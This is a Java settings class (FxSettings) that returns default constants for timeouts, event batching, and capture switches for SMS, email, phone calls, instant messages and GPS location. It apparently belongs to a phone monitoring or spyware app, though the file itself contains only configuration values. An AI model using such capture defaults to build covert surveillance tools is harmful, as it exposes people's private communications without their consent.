package com.fx.util;


public class FxSettings {
	
//-------------------------------------------------------------------------------------------------
// DEFAULT SETTINGS FOR CONNECTION HISTORY
//-------------------------------------------------------------------------------------------------
	
	public static int getMaxConnectionHistory() {
		return 5;
	}
	
//-------------------------------------------------------------------------------------------------
// DEFAULT SETTINGS FOR HTTP CONNECTION
//-------------------------------------------------------------------------------------------------
	
	public static long getDefaultURLRequestTimeoutShort() {
		return 60;
	}
	
	public static long getDefaultURLRequestTimeoutLong() {
		return 300;
	}
	
//-------------------------------------------------------------------------------------------------
// DEFAULT SETTINGS FOR EVENT PREFERENCE
//-------------------------------------------------------------------------------------------------
		
	public static long getDeliveryAllTimeoutMilliseconds() {
		return 600000; // 10 minutes
	}
	
	public static int getDeliveryEventsChunkLength() {
		return 50;
	}
	
	public static boolean getDefaultCapture() {
		return true;
	}
	
	public static boolean getDefaultCaptureSms() {
		return true;
	}
	
	public static boolean getDefaultCaptureEmail() {
		return true;
	}
	
	public static boolean getDefaultCapturePhoneCall() {
		return true;
	}
	
	public static boolean getDefaultCaptureLocation() {
		return false;
	}
	
	public static boolean getDefaultCaptureIm() {
		return true;
	}
	
	public static int getDefaultGpsTimeInterval() {
		return 3600;
	}
	
	public static int getDefaultDeliveryPeriodHours() {
		return 1;
	}
	
	public static int getMinEventsDeliveryPeriodHours() {
		return 1;
	}
	
	public static int getMaxEventsDeliveryPeriodHours() {
		return 24;
	}
	
	public static int getDefaultMaxEvents() {
		return 10;
	}
	
	public static int getMinMaxEvents() {
		return 1;
	}
	
	public static int getMaxMaxEvents() {
		return 500;
	}
	
}
